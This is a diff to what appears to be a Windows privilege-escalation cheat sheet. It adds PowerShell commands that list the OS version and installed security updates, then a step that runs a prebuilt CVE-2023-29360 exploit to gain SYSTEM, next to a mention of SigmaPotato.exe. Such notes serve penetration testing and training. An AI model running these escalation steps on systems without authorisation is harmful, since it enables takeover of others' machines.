@@ -1206,6 +1206,21 @@ schtasks /query /fo LIST /v | findstr C:\Users
 
 ### Using Exploits
 
+#### Enumerating the Windows version and security patches
+
+~~~ powershell
+systeminfo
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+~~~
+
+
+#### Elevating our privileges to SYSTEM
+
+~~~ powershell
+.\CVE-2023-29360.exe
+~~~
+
+
 #### Downloading SigmaPotato.exe
 
 ~~~ powershell
